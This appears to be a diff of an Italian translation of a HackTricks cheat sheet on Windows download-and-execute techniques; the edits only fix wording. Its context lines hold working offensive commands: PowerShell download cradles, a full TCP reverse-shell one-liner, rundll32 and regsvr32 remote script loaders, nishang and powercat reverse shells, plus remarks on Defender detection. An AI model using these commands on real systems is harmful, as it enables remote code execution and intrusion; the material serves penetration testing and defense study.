@@ -94,7 +94,7 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 Processo che esegue la chiamata di rete: **powershell.exe**\
-Payload scritto su disco: **NO** (_almeno da nessuna parte che io possa trovare usando procmon !_ )
+Payload scritto su disco: **NO** (_almeno da nessuna parte che io possa trovare usando procmon!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
@@ -105,7 +105,7 @@ Payload scritto su disco: **WebDAV client local cache**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**Ottieni ulteriori informazioni su diversi Shell di Powershell alla fine di questo documento**
+**Ottieni ulteriori informazioni su diversi shell di Powershell alla fine di questo documento**
 
 ## Mshta
 
@@ -190,7 +190,7 @@ rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-**Rilevato da defender**
+**Rilevato dal difensore**
 
 **Rundll32 - sct**
 
@@ -264,7 +264,7 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**Puoi scaricare ed eseguire molto facilmente uno zombie Koadic utilizzando il stager regsvr**
+**Puoi scaricare ed eseguire molto facilmente uno zombie Koadic utilizzando il caricatore regsvr**
 
 ## Certutil
 
@@ -391,7 +391,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-Nella cartella **Shells**, ci sono molte shell diverse. Per scaricare ed eseguire Invoke-_PowerShellTcp.ps1_, fai una copia dello script e aggiungi alla fine del file:
+Nella cartella **Shells**, ci sono molte shell diverse. Per scaricare ed eseguire Invoke-_PowerShellTcp.ps1_ fai una copia dello script e aggiungi alla fine del file:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
@@ -407,7 +407,7 @@ Defender non lo rileva come codice malevolo (ancora, 3/04/2019).
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-Scarica, avvia un server web, avvia il listener e eseguilo sul lato della vittima:
+Scarica, avvia un server web, avvia il listener ed eseguilo sul lato della vittima:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -487,7 +487,7 @@ Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" dat
 
 * Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
 
 </details>
 {% endhint %}
